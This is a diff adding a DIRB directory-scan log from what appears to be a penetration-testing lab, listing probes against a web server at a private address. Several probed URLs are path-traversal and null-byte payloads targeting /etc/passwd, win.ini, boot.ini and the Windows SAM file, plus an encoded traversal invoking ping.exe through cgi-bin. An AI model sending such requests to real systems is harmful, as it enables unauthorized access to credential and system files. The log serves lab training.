@@ -1,0 +1,48 @@
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+OUTPUT_FILE: results/lab2018/10.11.1.39_dirb_cgis.txt
+START_TIME: Sun Mar 18 13:21:29 2018
+URL_BASE: http://10.11.1.39:80/
+WORDLIST_FILES: /usr/share/dirb/wordlists/vulns/cgis.txt
+OPTION: Not Recursive
+OPTION: Silent Mode
+
+-----------------
+
+GENERATED WORDS: 3388
+
+---- Scanning URL: http://10.11.1.39:80/ ----
++ http://10.11.1.39:80/./ (CODE:403|SIZE:4897)
++ http://10.11.1.39:80/web-console/ServerInfo.jsp%00 (CODE:400|SIZE:172)
++ http://10.11.1.39:80/%NETHOOD%/ (CODE:400|SIZE:172)
++ http://10.11.1.39:80// (CODE:403|SIZE:4897)
++ http://10.11.1.39:80/%00/ (CODE:400|SIZE:172)
++ http://10.11.1.39:80/%2e/ (CODE:403|SIZE:4897)
++ http://10.11.1.39:80/%2f/ (CODE:403|SIZE:4897)
++ http://10.11.1.39:80/index.jsp%00x (CODE:400|SIZE:172)
++ http://10.11.1.39:80/%a%s%p%d (CODE:400|SIZE:172)
++ http://10.11.1.39:80/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd (CODE:400|SIZE:172)
++ http://10.11.1.39:80/[SecCheck]/..%2f../ext.ini (CODE:400|SIZE:172)
++ http://10.11.1.39:80/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../boot.ini (CODE:400|SIZE:172)
++ http://10.11.1.39:80/cgi-bin/ssi//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd (CODE:400|SIZE:172)
++ http://10.11.1.39:80/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini (CODE:400|SIZE:172)
++ http://10.11.1.39:80/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd (CODE:400|SIZE:172)
++ http://10.11.1.39:80/%00 (CODE:400|SIZE:172)
++ http://10.11.1.39:80/ext.ini.%00.txt (CODE:400|SIZE:172)
++ http://10.11.1.39:80/// (CODE:403|SIZE:4897)
++ http://10.11.1.39:80/cgi-bin/ (CODE:403|SIZE:210)
++ http://10.11.1.39:80/icons/ (CODE:200|SIZE:74199)
++ http://10.11.1.39:80//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// (CODE:403|SIZE:4897)
++ http://10.11.1.39:80/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%49%4E%4E%54%2F%73%79%73%74%65%6D%33%32%2Fping.exe%20127.0.0.1 (CODE:400|SIZE:172)
++ http://10.11.1.39:80/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%69%6E%64%6F%77%73%2Fping.exe%20127.0.0.1 (CODE:400|SIZE:172)
++ http://10.11.1.39:80/..%2F..%2F..%2F..%2F..%2F../windows/repair/sam (CODE:400|SIZE:172)
++ http://10.11.1.39:80/..%2F..%2F..%2F..%2F..%2F../winnt/repair/sam (CODE:400|SIZE:172)
++ http://10.11.1.39:80/..%2F..%2F..%2F..%2F..%2F../winnt/repair/sam._ (CODE:400|SIZE:172)
+
+-----------------
+END_TIME: Sun Mar 18 13:23:40 2018
+DOWNLOADED: 3388 - FOUND: 26
